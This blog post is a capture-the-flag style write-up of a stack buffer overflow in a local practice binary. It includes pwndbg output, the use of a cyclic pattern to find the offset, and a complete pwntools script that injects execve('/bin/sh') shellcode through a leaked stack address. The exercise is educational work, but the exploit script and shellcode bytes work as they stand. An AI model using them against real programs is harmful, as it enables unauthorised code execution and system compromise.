---
title: "Overflow - 2"
date: 2019-07-19
description: "Return 2 shellcode"
tags: ["Binary Exploitation Series"]
type: post
weight: 20
showTableOfContents: true
---



# Buffer Overflow (ret2shellcode)

---

# ⚖️ Challenge Write-up

---

# General Analysis

![Untitled.png](https://hackmd.io/_uploads/BJ9_whL7a.png)

# Functions

```nasm
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010b0  puts@plt
0x00000000004010c0  setresuid@plt
0x00000000004010d0  setresgid@plt
0x00000000004010e0  printf@plt
0x00000000004010f0  geteuid@plt
0x0000000000401100  gets@plt
0x0000000000401110  getegid@plt
0x0000000000401120  execl@plt
0x0000000000401130  _start
0x0000000000401160  _dl_relocate_static_pie
0x0000000000401170  deregister_tm_clones
0x00000000004011a0  register_tm_clones
0x00000000004011e0  __do_global_dtors_aux
0x0000000000401210  frame_dummy
0x0000000000401216  win
0x0000000000401259  init
0x00000000004012a6  main
0x0000000000401310  __libc_csu_init
0x0000000000401380  __libc_csu_fini
0x0000000000401388  _fini
pwndbg>

no win function to call shellcode, need to inject our very own into the system.
```

# Exploit to find at what offset we have buffer overflow

```nasm
pwndbg> cyclic 120
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaa
laaaaaaamaaaaaaanaaaaaaaoaaaaaaa
pwndbg> r
Starting program: /home/shinjitsu/Youtube/Binary Exploitation/5. Ret2Shellcode/ret2shellcode 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
We have just fixed the plumbing systm, let's hope there's no leaks!
>.> aaaaah shiiit wtf is dat address doin here...  0x7fffffffe1d0
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaa

pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

- Thus anything more than 40 will get overflowed
- Writing out our exploit

```python
#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('ret2shellcode')

p = process('./ret2shellcode')
p.recvuntil(b'... ')
leak = int(p.recv(),16)
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload = shellcode + cyclic(16) + pack(leak)
p.sendline(payload)
p.interactive()
```

# Output

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
[+] Starting local process './ret2shellcode': pid 2819
[*] Switching to interactive mode
$ ls
README.md  exploit.py  ret2shellcode

Thus we got the shell!!!!!!
```